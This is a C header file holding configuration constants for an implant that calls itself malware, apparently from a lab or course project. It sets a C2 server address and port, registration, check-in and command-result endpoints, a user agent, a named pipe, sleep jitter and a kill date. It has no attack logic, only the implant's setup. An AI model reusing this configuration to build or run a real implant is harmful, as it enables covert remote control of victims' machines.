#ifndef CONFIG_H_
#define CONFIG_H_

#define DEBUG 1

#if DEBUG == 1
#include <stdio.h>
#include <iostream>
#define LOG wprintf
#else
#define LOG void
#endif


#define MALWARE_FILE_EXISTS_STRING "C:\\malware\\ch0nky.txt"
#define MALWARE_KILL_DATE_DAY 1 
#define MALWARE_KILL_DATE_MONTH 1 
#define MALWARE_KILL_DATE_YEAR 2022 
#define MALWARE_NAMED_PIPE "ch0nky"

#define MALWARE_SLEEP_MILLISECONDS_JITTER (DWORD)(2000 + rand()/(RAND_MAX + 1)  * (3000)) /*Random jitter between 2sec to 5seconds*/

#define MALWARE_C2_SERVER_USER_AGENT L"ny4n_ca1"
#define MALWARE_JSON_REQUEST_HEADER L"Content-Type: application/json\r\n"
#define MALWARE_C2_SERVER_ADDRESS L"172.20.140.200"
#define MALWARE_C2_SERVER_PORT 8080
#define MALWARE_C2_SERVER_REGISTER_URI L"/register"
#define MALWARE_C2_SERVER_CHECKIN_URI L"/checkin"
#define MALWARE_C2_SERVER_DATACMD_URI L"/data_cmd_result"
#define MALWARE_C2_SERVER_USE_TLS false

#endif